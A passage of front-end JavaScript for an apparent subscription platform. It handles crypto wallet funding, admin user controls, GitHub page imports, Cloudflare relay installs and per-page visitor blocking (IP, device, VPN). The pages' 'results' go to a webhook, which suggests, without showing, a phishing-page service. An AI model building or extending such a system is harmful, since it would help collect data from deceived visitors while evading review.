  const rate = card.querySelector("[data-wallet-quote-rate]");
  card.dataset.quoteState = state;
  if (amount) amount.textContent = detail || "Enter an amount to calculate crypto.";
  if (rate && state !== "ready") {
    rate.textContent = state === "error" ? "Fix the amount or try another crypto option." : "Quote updates from the backend before you submit.";
  }
}

async function updateWalletFundingQuote() {
  const amountField = preview.querySelector('[data-wallet-fund="amount"]');
  const cryptoField = preview.querySelector('[data-wallet-fund="crypto"]');
  if (!amountField || !cryptoField) return;

  const amount = Number(amountField.value || 0);
  const selected = walletFundingOptionByValue(cryptoField.value);
  if (!Number.isFinite(amount) || amount <= 0) {
    setWalletQuoteState("idle");
    return;
  }
  if (amount < minimumWalletFundingUsd) {
    setWalletQuoteState("error", `Minimum funding is ${formatMoney(minimumWalletFundingUsd)}.`);
    return;
  }

  setWalletQuoteState("loading", "Calculating crypto equivalent...");
  try {
    const params = new URLSearchParams({
      amount: String(amount),
      cryptoType: selected.asset,
      network: selected.network
    });
    const result = await requestApi(`/api/wallet/quote?${params.toString()}`);
    const quote = result.quote || {};
    const card = preview.querySelector("[data-wallet-quote]");
    if (!card) return;
    const amountLabel = card.querySelector("[data-wallet-quote-amount]");
    const rateLabel = card.querySelector("[data-wallet-quote-rate]");
    card.dataset.quoteState = "ready";
    if (amountLabel) amountLabel.textContent = `Send ${quote.cryptoAmount} ${quote.cryptoType} for ${formatMoney(quote.usdAmount)} wallet credit.`;
    if (rateLabel) rateLabel.textContent = `Rate: ${formatMoney(quote.rate)} per ${quote.cryptoType} / ${quote.source || "rate provider"}`;
  } catch (error) {
    setWalletQuoteState("error", `Quote unavailable: ${error.message}`);
  }
}

function scheduleWalletFundingQuote() {
  if (walletQuoteTimer) window.clearTimeout(walletQuoteTimer);
  walletQuoteTimer = window.setTimeout(updateWalletFundingQuote, 350);
}

function updateWalletFundingAddress(select) {
  const card = preview.querySelector("[data-wallet-address-card]");
  if (!card) return;
  card.outerHTML = walletFundingAddressMarkup(walletFundingOptionByValue(select.value));
  scheduleWalletFundingQuote();
}

function walletHistoryDate(value) {
  if (!value) return "wallet";
  return `${formatTrafficDate(value)} ${formatTrafficTime(value)}`.trim();
}

function walletFundingQuoteSummary(request) {
  const quote = request?.quote || {};
  if (!quote.cryptoAmount || !quote.cryptoType) return "";
  const rate = quote.rate ? ` at ${formatMoney(quote.rate)}` : "";
  return `Expected ${quote.cryptoAmount} ${quote.cryptoType}${rate}`;
}

function walletFundingRowMarkup(request) {
  const quoteSummary = walletFundingQuoteSummary(request);
  const expected = quoteSummary
    ? `<em>${escapeHtml(quoteSummary)}</em>`
    : `<em>${escapeHtml(walletHistoryDate(request.createdAt))}</em>`;
  return `
    <div class="wallet-history-row">
      <span>${escapeHtml(request.cryptoType || "Crypto")} ${escapeHtml(request.network || "")}</span>
      <b>${formatMoney(request.amount)}</b>
      <small class="fund-status fund-status-${escapeHtml(request.status || "pending")}">${escapeHtml(request.status || "pending")}</small>
      <code>${escapeHtml(request.txHash || "no hash")}</code>
      ${expected}
    </div>
  `;
}

function walletTransactionRowMarkup(transaction) {
  const amount = Number(transaction.amount || 0);
  return `
    <div class="wallet-history-row wallet-transaction-row">
      <span>${escapeHtml(String(transaction.type || "wallet").replace(/_/g, " "))}</span>
      <b class="${amount < 0 ? "is-negative" : "is-positive"}">${amount < 0 ? "-" : "+"}${formatMoney(Math.abs(amount))}</b>
      <small>${escapeHtml(walletHistoryDate(transaction.createdAt))}</small>
      <code>${escapeHtml(transaction.description || "Wallet activity")}</code>
    </div>
  `;
}

function renderWallet() {
  activeFlowSlug = null;
  const recentRequests = walletDepositRequests.slice(0, 5);
  const recentTransactions = (walletData.transactions || []).slice(0, 6);
  const selectedFundingOption = walletFundingOptionByValue(walletFundingOptions[0]?.value);
  preview.innerHTML = `
    <section class="app-view wallet-view">
      <div class="view-heading">
        <small>wallet / subscription</small>
        <h2>Wallet</h2>
      </div>
      <div class="wallet-grid">
        <article class="wallet-balance package-form">
          <small>available wallet balance</small>
          <strong>${formatMoney(walletData.balance)}</strong>
          <div class="wallet-actions">
            <button type="button" data-wallet-fund-toggle>${walletFundOpen ? "Close funding" : "Fund wallet"}</button>
            <button type="button" data-wallet-history-toggle>${walletHistoryOpen ? "Hide history" : "History"}</button>
          </div>
          ${walletFundOpen ? `
            <div class="wallet-fund-panel">
              <div class="wallet-fund-grid">
                <label>
                  <span>Amount USD</span>
                  <input type="number" min="${minimumWalletFundingUsd}" step="0.01" data-wallet-fund="amount" placeholder="30">
                </label>
                <label>
                  <span>Crypto</span>
                  <select data-wallet-fund="crypto">
                    ${walletFundingOptions.map((option) => `<option value="${escapeHtml(option.value)}">${escapeHtml(option.label)}${option.configured ? "" : " - not set"}</option>`).join("")}
                  </select>
                </label>
              </div>
              ${walletFundingQuoteMarkup()}
              ${walletFundingAddressMarkup(selectedFundingOption)}
              <label>
                <span>Transaction hash</span>
                <input type="text" data-wallet-fund="txHash" placeholder="Paste payment hash">
              </label>
              <div class="wallet-actions">
                <button type="button" data-submit-wallet-fund>Submit hash</button>
              </div>
            </div>
          ` : ""}
          ${walletHistoryOpen ? `
            <div class="wallet-history-panel">
              <section>
                <div class="wallet-history-heading">
                  <span>Funding requests</span>
                  <small>${walletDepositRequests.length} total</small>
                </div>
                <div class="wallet-history-list">
                  ${recentRequests.length ? recentRequests.map(walletFundingRowMarkup).join("") : `<div class="wallet-history-empty">No funding requests yet</div>`}
                </div>
              </section>
              <section>
                <div class="wallet-history-heading">
                  <span>Transactions</span>
                  <small>${recentTransactions.length} recent</small>
                </div>
                <div class="wallet-history-list">
                  ${recentTransactions.length ? recentTransactions.map(walletTransactionRowMarkup).join("") : `<div class="wallet-history-empty">No wallet transactions yet</div>`}
                </div>
              </section>
            </div>
          ` : ""}
        </article>
      </div>
    </section>
  `;
  statusText.textContent = "WALLET READY";
  topbarTitle.textContent = "Wallet / Subscription";
}

function renderRoute() {
  const hash = window.location.hash || (isLoggedIn() ? "#dashboard" : "#login");
  const publicRoutes = ["#login", "#signup"];
  syncAdminVisibility();
  clearAppBusySoon();
  if (!hash.startsWith("#results-")) stopResultsAutoRefresh();

  if (!isLoggedIn() && !publicRoutes.includes(hash)) {
    setActiveNav("#dashboard");
    renderLogin();
    return;
  }

  if (isLoggedIn() && publicRoutes.includes(hash)) {
    window.location.hash = "#dashboard";
    return;
  }

  setAuthLayout(false);
  if (isAdminRoute(hash) && !isAdmin()) {
    window.location.hash = "#dashboard";
    statusText.textContent = "ADMIN ACCESS REQUIRED";
    return;
  }

  setActiveNav(["#pages", "#admin", "#my-pages", "#wallet"].includes(hash) ? hash : "#dashboard");

  if (hash === "#login") {
    setActiveNav("#dashboard");
    renderLogin();
    return;
  }

  if (hash === "#signup") {
    setActiveNav("#dashboard");
    renderSignup();
    return;
  }

  if (hash === "#pages") {
    renderPages();
    return;
  }

  if (hash === "#admin") {
    renderAdmin();
    return;
  }

  if (hash === "#admin-users") {
    setActiveNav("#admin");
    renderAdminUsers();
    return;
  }

  if (hash.startsWith("#admin-import-")) {
    setActiveNav("#admin");
    renderAdminImportWizard(hash.replace("#admin-import-", ""));
    return;
  }

  if (hash.startsWith("#admin-package-")) {
    setActiveNav("#admin");
    renderAdminPackageEditor(hash.replace("#admin-package-", ""));
    return;
  }

  if (hash.startsWith("#flow-")) {
    setActiveNav("#my-pages");
    window.location.hash = "#my-pages";
    statusText.textContent = "PAGE BUILDER REMOVED";
    return;
  }

  if (hash.startsWith("#config-")) {
    setActiveNav("#my-pages");
    renderUserConfigCenter(hash.replace("#config-", ""));
    return;
  }

  if (hash.startsWith("#go-live-")) {
    setActiveNav("#my-pages");
    renderGoLiveCenter(hash.replace("#go-live-", ""));
    return;
  }

  if (hash.startsWith("#security-")) {
    setActiveNav("#my-pages");
    const [pageSlug, tab = "security"] = hash.replace("#security-", "").split(":");
    renderSecurityCenter(pageSlug, tab);
    return;
  }

  if (hash.startsWith("#results-")) {
    setActiveNav("#my-pages");
    renderResultsCenter(hash.replace("#results-", ""));
    return;
  }

  if (["#my-pages", "#domains", "#security", "#traffic", "#settings"].includes(hash)) {
    setActiveNav("#my-pages");
    renderMyPages();
    return;
  }

  if (hash === "#wallet") {
    renderWallet();
    return;
  }

  renderDashboard();
}

if (copyButton) {
  copyButton.addEventListener("click", async () => {
    const markup = document.querySelector(`#${activeTemplate.id}`).innerHTML.trim();
    await navigator.clipboard.writeText(markup);
    statusText.textContent = "TEMPLATE MARKUP COPIED";
    window.setTimeout(() => {
      statusText.textContent = activeTemplate.status;
    }, 1600);
  });
}

if (randomButton) {
  randomButton.addEventListener("click", () => {
    const pool = templates.filter((template) => template.id !== activeTemplate.id);
    const next = pool[Math.floor(Math.random() * pool.length)];
    setTemplate(next);
  });
}

swatches.addEventListener("click", (event) => {
  const swatch = event.target.closest(".swatch");
  if (!swatch) return;

  setAccentColor(swatch.dataset.accent, true);
});

themeToggle.addEventListener("click", () => {
  const root = document.documentElement;
  const isLight = root.dataset.theme === "light";
  setThemeMode(isLight ? "dark" : "light", true);
});

document.querySelector("[data-logout]")?.addEventListener("click", handleLogout);

function saveSecurityConfig(page, tab = "security") {
  if (!page) {
    renderMissingPage();
    return;
  }
  const domainsField = preview.querySelector('[data-security-field="domains"]');
  const captchaField = preview.querySelector('[data-security-field="captcha"]');
  const turnstileSiteKeyField = preview.querySelector('[data-security-field="turnstileSiteKey"]');
  const turnstileSecretKeyField = preview.querySelector('[data-security-field="turnstileSecretKey"]');
  const bannedField = preview.querySelector('[data-security-field="bannedIps"]');
  const whitelistField = preview.querySelector('[data-security-field="whitelistIps"]');
  const blockedDevices = [...preview.querySelectorAll("[data-security-device]:checked")].map((field) => field.dataset.securityDevice);
  const proxyRuleFields = [...preview.querySelectorAll("[data-security-proxy]")];
  const current = page.securityConfig || {};
  const currentTurnstile = current.turnstile || {};
  const currentProxyRules = current.vpnProxyRules || {};
  const vpnProxyRules = proxyRuleFields.length
    ? proxyRuleFields.reduce((rules, field) => ({ ...rules, [field.dataset.securityProxy]: field.checked }), {})
    : currentProxyRules;
  const ipRules = reconcileIpRules(
    bannedField ? splitRuleList(bannedField.value) : current.bannedIps || [],
    whitelistField ? splitRuleList(whitelistField.value) : current.whitelistIps || []
  );

  applyPageSecurityConfig(page, {
    ...current,
    domains: domainsField ? splitRuleList(domainsField.value) : current.domains || [],
    captcha: captchaField ? captchaField.checked : Boolean(current.captcha),
    turnstile: {
      provider: "turnstile",
      siteKey: turnstileSiteKeyField ? turnstileSiteKeyField.value.trim() : currentTurnstile.siteKey || current.turnstileSiteKey || "",
      secretKey: turnstileSecretKeyField ? turnstileSecretKeyField.value.trim() : currentTurnstile.secretKey || current.turnstileSecretKey || ""
    },
    bannedIps: ipRules.bannedIps,
    whitelistIps: ipRules.whitelistIps,
    blockedDevices: preview.querySelector("[data-security-device]") ? blockedDevices : current.blockedDevices || [],
    vpnProxyRules
  });
  saveFlowState(page);
  renderSecurityCenter(pageRouteKey(page), tab);
  statusText.textContent = "SECURITY SETTINGS SAVED";
}

function saveUserConfig(page) {
  if (!page) {
    renderMissingPage();
    return;
  }
  const getField = (name) => preview.querySelector(`[data-user-config="${name}"]`);
  const fieldValue = (name, fallback = "") => getField(name)?.value.trim() || fallback;
  const fieldChecked = (name, fallback = false) => getField(name)?.checked ?? fallback;
  const domain = fieldValue("domain", page.hostingConfig?.domain || page.domain || "");

  page.domain = domain;
  page.subscription = {
    ...(page.subscription || {}),
    autoRenew: fieldChecked("autoRenew", Boolean(page.subscription?.autoRenew))
  };
  page.generatedFile = {
    ...(page.generatedFile || {}),
    apiBase: page.generatedFile?.apiBase || "/api",
    downloadName: page.generatedFile?.downloadName || `${page.slug}-index.html`,
    version: page.generatedFile?.version || "build-001"
  };
  page.resultSettings = {
    ...(page.resultSettings || {}),
    webhook: page.resultSettings?.webhook || "/api/page-results",
    retentionDays: Number(fieldValue("retentionDays", page.resultSettings?.retentionDays || 30)),
    notifyOnResult: fieldChecked("notifyOnResult", Boolean(page.resultSettings?.notifyOnResult))
  };
  page.hostingConfig = {
    ...(page.hostingConfig || {}),
    domain
  };
  page.securityConfig = {
    ...(page.securityConfig || {}),
    domains: domain ? [domain] : []
  };

  saveFlowState(page);
  renderUserConfigCenter(pageRouteKey(page));
  statusText.textContent = `${page.name.toUpperCase()} USER CONFIG SAVED`;
}

function collectHostingFields(page) {
  const field = (name) => preview.querySelector(`[data-hosting-field="${name}"]`)?.value.trim() || "";
  const selectedHostingType = field("hostingType") || "render-static-site";
  return {
    domain: field("domain") || page.domain,
    serverIp: field("serverIp"),
    connectionType: field("connectionType") || "cloudflare-worker",
    hostingType: selectedHostingType,
    installPath: field("installPath") || (selectedHostingType === "render-static-site" ? "root / public directory" : "public_html"),
    relayTarget: page.hostingConfig?.relayTarget || apiBase(),
    relaySecret: page.hostingConfig?.relaySecret || ""
  };
}

function saveHostingConfig(page, verify = false) {
  if (!page) {
    renderMissingPage();
    return;
  }
  const hosting = collectHostingFields(page);
  const hasRelay = hosting.connectionType === "cloudflare-worker";
  const isRenderStatic = hosting.hostingType === "render-static-site";
  const needsOrigin = !hasRelay && !isRenderStatic;
  const hasMinimumConfig = Boolean(hosting.domain && (hasRelay ? hosting.relaySecret : needsOrigin ? hosting.serverIp : true));

  page.domain = hosting.domain;
  page.hostingConfig = {
    ...(page.hostingConfig || {}),
    ...hosting,
    verified: verify ? hasMinimumConfig : Boolean(page.hostingConfig?.verified && hasMinimumConfig),
    verifiedAt: verify && hasMinimumConfig ? new Date().toISOString() : page.hostingConfig?.verifiedAt || null,
    relayVerified: verify && hasRelay && hasMinimumConfig ? true : Boolean(page.hostingConfig?.relayVerified && hasMinimumConfig),
    relayVerifiedAt: verify && hasRelay && hasMinimumConfig ? new Date().toISOString() : page.hostingConfig?.relayVerifiedAt || null,
    workerRoute: hosting.domain ? `${hosting.domain}/api/*` : "",
    liveStatus: verify && hasMinimumConfig ? "Live" : hasMinimumConfig ? "Ready to verify" : "Setup required"
  };
  page.securityConfig = {
    ...(page.securityConfig || {}),
    domains: hosting.domain ? [hosting.domain] : []
  };
  page.generatedFile = {
    ...(page.generatedFile || {}),
    apiBase: hosting.connectionType === "cloudflare-worker" ? "/api" : hosting.relayTarget,
    lastGeneratedAt: page.generatedFile?.lastGeneratedAt || null
  };

  saveFlowState(page);
  renderGoLiveCenter(pageRouteKey(page));
  statusText.textContent = verify
    ? hasMinimumConfig ? "HOSTING CONNECTION VERIFIED" : "DOMAIN AND SERVER IP REQUIRED"
    : "HOSTING SETTINGS SAVED";
}

function generateRelaySecretForPage(page) {
  if (!page) return;
  const hosting = collectHostingFields(page);
  page.hostingConfig = {
    ...(page.hostingConfig || {}),
    ...hosting,
    connectionType: hosting.connectionType || "cloudflare-worker",
    relaySecret: generateRelaySecret(),
    relayVerified: false,
    workerRoute: hosting.domain ? `${hosting.domain}/api/*` : ""
  };
  page.generatedFile = {
    ...(page.generatedFile || {}),
    apiBase: page.hostingConfig.connectionType === "cloudflare-worker" ? "/api" : page.hostingConfig.relayTarget
  };
  saveFlowState(page);
  renderGoLiveCenter(pageRouteKey(page));
  statusText.textContent = "CLOUDFLARE RELAY SECRET GENERATED";
}

function collectCloudflareFields(page) {
  const field = (name) => preview.querySelector(`[data-cloudflare-field="${name}"]`)?.value.trim() || "";
  return {
    domain: page.hostingConfig?.domain || page.domain,
    accountId: field("accountId"),
    apiToken: field("apiToken"),
    scriptName: field("scriptName")
  };
}

async function verifyCloudflareForPage(page) {
  if (!page) return;
  const payload = collectCloudflareFields(page);
  if (!payload.domain || !payload.apiToken) {
    statusText.textContent = "DOMAIN AND CLOUDFLARE TOKEN REQUIRED";
    return;
  }
  statusText.textContent = "VERIFYING CLOUDFLARE ZONE";
  try {
    const result = await requestApi(`/api/user-pages/${page.id}/cloudflare/verify`, {
      method: "POST",
      body: JSON.stringify(payload)
    });
    const updated = normalizeUserPage(result.userPage);
    ownedPages = ownedPages.map((item) => item.id === updated.id ? updated : item);
    renderGoLiveCenter(pageRouteKey(updated));
    statusText.textContent = "CLOUDFLARE ZONE VERIFIED";
  } catch (error) {
    statusText.textContent = `CLOUDFLARE VERIFY FAILED: ${error.message}`.toUpperCase();
  }
}

async function installCloudflareForPage(page) {
  if (!page) return;
  const payload = collectCloudflareFields(page);
  if (!payload.domain || !payload.accountId || !payload.apiToken) {
    statusText.textContent = "DOMAIN, ACCOUNT ID, AND CLOUDFLARE TOKEN REQUIRED";
    return;
  }
  if (!page.hostingConfig?.relaySecret) {
    statusText.textContent = "GENERATE RELAY SECRET FIRST";
    return;
  }
  statusText.textContent = "INSTALLING CLOUDFLARE WORKER";
  try {
    const result = await requestApi(`/api/user-pages/${page.id}/cloudflare/install`, {
      method: "POST",
      body: JSON.stringify(payload)
    });
    const updated = normalizeUserPage(result.userPage);
    ownedPages = ownedPages.map((item) => item.id === updated.id ? updated : item);
    renderGoLiveCenter(pageRouteKey(updated));
    statusText.textContent = "CLOUDFLARE WORKER INSTALLED";
  } catch (error) {
    statusText.textContent = `CLOUDFLARE INSTALL FAILED: ${error.message}`.toUpperCase();
  }
}

function collectGithubImportFields() {
  const field = (name) => preview.querySelector(`[data-github-field="${name}"]`)?.value.trim() || "";
  return {
    repoUrl: field("repoUrl"),
    branch: field("branch"),
    folder: field("folder"),
    packageName: field("packageName") || "GitHub Imported Page",
    slug: field("slug") || "github-imported-page"
  };
}

function githubFileUrl(scan, filePath, mode = "blob") {
  const base = mode === "raw"
    ? `https://raw.githubusercontent.com/${scan.owner}/${scan.repo}/${scan.branch}`
    : `https://github.com/${scan.owner}/${scan.repo}/blob/${scan.branch}`;
  return `${base}/${scan.folder ? `${scan.folder}/` : ""}${filePath.replace(`${scan.folder}/`, "")}`;
}

function githubPreviewUrl(scan, filePath) {
  const params = new URLSearchParams({
    repoUrl: scan.repoUrl,
    branch: scan.branch,
    file: filePath
  });
  return `${apiBase()}/api/admin/import/github/preview?${params.toString()}`;
}

function packagePreviewUrl(pagePackage) {
  if (!pagePackage.previewToken) return "";
  return `${apiBase()}/preview/${encodeURIComponent(pagePackage.previewToken)}`;
}

function packageAssetUrl(pagePackage, filePath) {
  if (!pagePackage.previewToken || !filePath) return "";
  const params = new URLSearchParams({ file: filePath });
  return `${apiBase()}/preview/${encodeURIComponent(pagePackage.previewToken)}/asset?${params.toString()}`;
}

function packageThumbnailUrl(pagePackage) {
  return pagePackage.thumbnailDataUrl || pagePackage.packageManifest?.thumbnailDataUrl || packageAssetUrl(pagePackage, pagePackage.thumbnailPath);
}

function pageInitials(name) {
  const initials = String(name || "PG")
    .trim()
    .split(/\s+/)
    .map((part) => part.charAt(0))
    .join("")
    .slice(0, 2)
    .toUpperCase();
  return initials || "PG";
}

function pageIconMarkup(pagePackage) {
  const thumbnailUrl = packageThumbnailUrl(pagePackage);
  const fallback = `<span class="market-icon-fallback">${escapeHtml(pageInitials(pagePackage.name))}</span>`;
  if (!thumbnailUrl) return `<span class="market-icon">${fallback}</span>`;
  return `
    <span class="market-icon has-image">
      <img src="${escapeHtml(thumbnailUrl)}" alt="${escapeHtml(pagePackage.name)} favicon" loading="lazy" onerror="this.remove()">
      ${fallback}
    </span>
  `;
}

function updateMarketPlanCard(select) {
  const pagePackage = marketPages.find((item) => item.slug === select.dataset.marketPlan);
  if (!pagePackage) return;
  selectedMarketPlans[pagePackage.slug] = select.value;
  const card = select.closest(".market-card");
  const priceLabel = card?.querySelector(`[data-market-price="${pagePackage.slug}"]`);
  const subscribeButton = card?.querySelector(`[data-market-subscribe="${pagePackage.slug}"]`);
  if (priceLabel) priceLabel.textContent = marketPriceLabel(pagePackage, select.value);
  if (subscribeButton) subscribeButton.textContent = marketSubscribeLabel(pagePackage, select.value);
}

async function subscribeToMarketPackage(button) {
  if (!isLoggedIn()) {
    window.location.hash = "#login";
    statusText.textContent = "LOGIN REQUIRED TO SUBSCRIBE";
    return;
  }

  await refreshAuthUser();

  const pagePackage = marketPages.find((item) => item.slug === button.dataset.marketSubscribe);
  if (!pagePackage) {
    statusText.textContent = "PAGE PACKAGE NOT FOUND";
    return;
  }

  const period = selectedBillingPeriod(pagePackage);
  const price = billingPrice(pagePackage, period);
  const originalLabel = button.textContent;
  button.disabled = true;
  button.textContent = "Subscribing...";
  statusText.textContent = `SUBSCRIBING TO ${pagePackage.name.toUpperCase()}`;

  try {
    await requestApi(`/api/packages/${pagePackage.slug}/subscribe`, {
      method: "POST",
      body: JSON.stringify({ billingPeriod: period })
    });
    await loadAppData();
    window.location.hash = "#my-pages";
    window.setTimeout(() => {
      statusText.textContent = isAdmin()
        ? `${pagePackage.name.toUpperCase()} ADMIN SUBSCRIPTION ACTIVE`
        : `${pagePackage.name.toUpperCase()} ${billingLabel(period).toUpperCase()} SUBSCRIPTION ACTIVE`;
    }, 50);
  } catch (error) {
    button.disabled = false;
    button.textContent = originalLabel;
    if (error.status === 402) {
      if (isAdmin()) {
        statusText.textContent = "ADMIN FREE ACCESS NOT ACTIVE ON API. RESTART SERVER AND TRY AGAIN";
        return;
      }
      const required = formatMoney(error.data?.price || price);
      const balance = formatMoney(error.data?.walletBalance || walletData.balance || 0);
      statusText.textContent = `WALLET TOO LOW: ${balance} AVAILABLE, ${required} REQUIRED`;
      window.setTimeout(() => {
        window.location.hash = "#wallet";
      }, 700);
      return;
    }
    if (error.status === 401) {
      window.location.hash = "#login";
      statusText.textContent = "LOGIN REQUIRED TO SUBSCRIBE";
      return;
    }
    if (error.status === 409) {
      await loadAppData();
      window.location.hash = "#my-pages";
      const existing = error.data?.userPage || error.data?.existingUserPage;
      const action = error.data?.action === "renew" ? "RENEW FROM MY PAGES" : "OPEN IT FROM MY PAGES";
      statusText.textContent = existing?.name
        ? `${existing.name.toUpperCase()} ALREADY SUBSCRIBED. ${action}`
        : `PAGE ALREADY SUBSCRIBED. ${action}`;
      return;
    }
    statusText.textContent = `SUBSCRIPTION FAILED: ${error.message}`.toUpperCase();
  }
}

async function renewPageFromWallet(page) {
  if (!page) {
    statusText.textContent = "PAGE RECORD NOT FOUND";
    return;
  }
  if (!isLoggedIn()) {
    window.location.hash = "#login";
    statusText.textContent = "LOGIN REQUIRED TO RENEW";
    return;
  }

  try {
    const result = await requestApi(`/api/user-pages/${page.id}/renew`, { method: "POST" });
    const updated = normalizeUserPage(result.userPage);
    ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
    if (typeof result.walletBalance === "number") walletData.balance = result.walletBalance;
    await loadAppData();
    renderMyPages();
    statusText.textContent = `${updated.name.toUpperCase()} RENEWED`;
  } catch (error) {
    if (error.status === 402) {
      const required = formatMoney(error.data?.price || page.subscription?.renewalPrice || 0);
      const balance = formatMoney(error.data?.walletBalance || walletData.balance || 0);
      statusText.textContent = `WALLET TOO LOW: ${balance} AVAILABLE, ${required} REQUIRED`;
      window.setTimeout(() => {
        window.location.hash = "#wallet";
      }, 700);
      return;
    }
    if (error.status === 401) {
      window.location.hash = "#login";
      statusText.textContent = "LOGIN REQUIRED TO RENEW";
      return;
    }
    statusText.textContent = `RENEWAL FAILED: ${error.message}`.toUpperCase();
  }
}

async function submitWalletFundRequest() {
  const field = (name) => preview.querySelector(`[data-wallet-fund="${name}"]`)?.value.trim() || "";
  const selected = walletFundingOptionByValue(field("crypto"));
  const payload = {
    amount: field("amount"),
    cryptoType: selected.asset,
    network: selected.network,
    txHash: field("txHash")
  };
  if (!payload.amount || Number(payload.amount) < minimumWalletFundingUsd) {
    statusText.textContent = `MINIMUM FUNDING IS ${formatMoney(minimumWalletFundingUsd)}`;
    setWalletQuoteState("error", `Minimum funding is ${formatMoney(minimumWalletFundingUsd)}.`);
    return;
  }
  if (!selected.address) {
    statusText.textContent = `${selected.label.toUpperCase()} RECEIVING ADDRESS NOT SET`;
    return;
  }
  if (!payload.txHash || payload.txHash.length < 8) {
    statusText.textContent = "TRANSACTION HASH REQUIRED";
    return;
  }
  try {
    await requestApi("/api/wallet/fund-request", {
      method: "POST",
      body: JSON.stringify(payload)
    });
    walletFundOpen = false;
    await loadAppData();
    renderWallet();
    statusText.textContent = "FUNDING REQUEST SUBMITTED";
  } catch (error) {
    if (error.status === 401) {
      window.location.hash = "#login";
      return;
    }
    statusText.textContent = `FUNDING FAILED: ${error.message}`.toUpperCase();
  }
}

async function approveWalletFundRequest(button) {
  const requestId = button.dataset.approveWalletFund;
  if (!requestId) return;
  const adminNote = preview.querySelector(`[data-fund-admin-note="${requestId}"]`)?.value.trim() || "";
  try {
    await requestApi(`/api/wallet/admin/fund-requests/${encodeURIComponent(requestId)}/approve`, {
      method: "POST",
      body: JSON.stringify({ adminNote })
    });
    await loadAppData();
    renderAdminUsers();
    statusText.textContent = "WALLET CREDIT APPROVED";
  } catch (error) {
    statusText.textContent = `APPROVAL FAILED: ${error.message}`.toUpperCase();
  }
}

async function updateWalletFundReview(button, action) {
  const requestId = button.dataset.reviewWalletFund || button.dataset.rejectWalletFund;
  if (!requestId) return;
  const adminNote = preview.querySelector(`[data-fund-admin-note="${requestId}"]`)?.value.trim() || "";
  try {
    await requestApi(`/api/wallet/admin/fund-requests/${encodeURIComponent(requestId)}/${action}`, {
      method: "POST",
      body: JSON.stringify({ adminNote })
    });
    await loadAppData();
    renderAdminUsers();
    statusText.textContent = action === "reject" ? "FUNDING REQUEST REJECTED" : "FUNDING REQUEST MARKED REVIEWING";
  } catch (error) {
    statusText.textContent = `FUNDING UPDATE FAILED: ${error.message}`.toUpperCase();
  }
}

async function refreshAdminUsers() {
  await loadAppData();
  renderAdminUsers();
  statusText.textContent = "ADMIN USERS REFRESHED";
}

async function saveAdminUserAccess(userId) {
  const user = adminUserById(userId);
  const role = preview.querySelector(`[data-admin-user-field="role"][data-admin-user="${userId}"]`)?.value || user?.role || "subscriber";
  const status = preview.querySelector(`[data-admin-user-field="status"][data-admin-user="${userId}"]`)?.value || user?.status || "active";
  const collabFields = [...preview.querySelectorAll(`[data-admin-collab="${userId}"]`)];
  const collabNote = preview.querySelector(`[data-admin-collab-note="${userId}"]`)?.value.trim() || "";
  const payload = { role, status };
  if (collabFields.length) {
    payload.collaboration = collabFields.reduce((collaboration, field) => ({
      ...collaboration,
      [field.dataset.adminCollabField]: field.checked
    }), { note: collabNote });
  }
  await requestApi(`/api/admin/users/${encodeURIComponent(userId)}`, {
    method: "PATCH",
    body: JSON.stringify(payload)
  });
  await loadAppData();
  renderAdminUsers();
  statusText.textContent = collabFields.length ? "USER COLLABS UPDATED" : "USER ACCESS UPDATED";
}

async function adjustAdminUserWallet(userId, mode) {
  const amountField = preview.querySelector(`[data-admin-wallet-amount="${userId}"]`);
  const note = preview.querySelector(`[data-admin-wallet-note="${userId}"]`)?.value.trim() || "";
  const amount = Number(amountField?.value || 0);
  if (!Number.isFinite(amount) || amount <= 0) {
    statusText.textContent = "WALLET AMOUNT REQUIRED";
    return;
  }
  await requestApi(`/api/admin/users/${encodeURIComponent(userId)}/wallet`, {
    method: "POST",
    body: JSON.stringify({
      amount: mode === "debit" ? -amount : amount,
      description: note || `Admin ${mode}`
    })
  });
  await loadAppData();
  renderAdminUsers();
  statusText.textContent = `USER WALLET ${mode === "debit" ? "DEBITED" : "CREDITED"}`;
}

async function extendAdminUserPage(userId) {
  const pageId = preview.querySelector(`[data-admin-page-select="${userId}"]`)?.value || "";
  const days = Number(preview.querySelector(`[data-admin-page-days="${userId}"]`)?.value || 0);
  const adminFreeSubscription = Boolean(preview.querySelector(`[data-admin-page-free="${userId}"]`)?.checked);
  const autoRenew = Boolean(preview.querySelector(`[data-admin-page-autorenew="${userId}"]`)?.checked);
  if (!pageId) {
    statusText.textContent = "SELECT A USER PAGE";
    return;
  }
  if (!Number.isFinite(days) || days <= 0) {
    statusText.textContent = "EXTEND DAYS REQUIRED";
    return;
  }
  await requestApi(`/api/admin/users/${encodeURIComponent(userId)}/pages/${encodeURIComponent(pageId)}/extend`, {
    method: "POST",
    body: JSON.stringify({ days, adminFreeSubscription, autoRenew, status: "active" })
  });
  await loadAppData();
  renderAdminUsers();
  statusText.textContent = "USER PAGE EXTENDED";
}

function renderGithubImportResult(scan, pagePackage) {
  const resultPanel = preview.querySelector("[data-github-result]");
  if (!resultPanel) return;
  const htmlScreens = scan.screens || [];
  const cssFiles = scan.cssFiles || [];
  const assets = scan.assets || [];
  const review = scan.review || { status: "review", checks: [], issues: [], warnings: [] };
  const firstPreviewUrl = htmlScreens[0] ? githubPreviewUrl(scan, htmlScreens[0].file) : "";
  const previewUrl = pagePackage ? packagePreviewUrl(pagePackage) : "";
  const editorHash = pagePackage?.slug ? `#admin-package-${pagePackage.slug}` : "";

  resultPanel.innerHTML = `
    <code>${pagePackage ? `${pagePackage.status === "published" ? "Published" : "Draft"} package ready: ${pagePackage.name} (${pagePackage.slug})` : `Connected: ${scan.owner}/${scan.repo}`}</code>
    <code>Branch: ${scan.branch}${scan.folder ? ` / folder: ${scan.folder}` : ""}</code>
    <code>Files: ${scan.summary.totalFiles} total / ${scan.summary.html} HTML / ${scan.summary.css} CSS / ${scan.summary.assets} assets</code>
    <div class="import-review-list">
      ${(review.checks || []).map((check) => `
        <span class="is-${escapeHtml(check.status)}">
          <strong>${escapeHtml(check.label)}</strong>
          <em>${escapeHtml(check.detail)}</em>
        </span>
      `).join("")}
    </div>
    ${(review.issues || []).length ? `
      <div class="import-alert is-blocked">
        ${(review.issues || []).map((issue) => `<code>${escapeHtml(issue)}</code>`).join("")}
      </div>
    ` : ""}
    ${(review.warnings || []).length ? `
      <div class="import-alert">
        ${(review.warnings || []).map((warning) => `<code>${escapeHtml(warning)}</code>`).join("")}
      </div>
    ` : ""}
    ${pagePackage ? `
      <div class="import-result-actions">
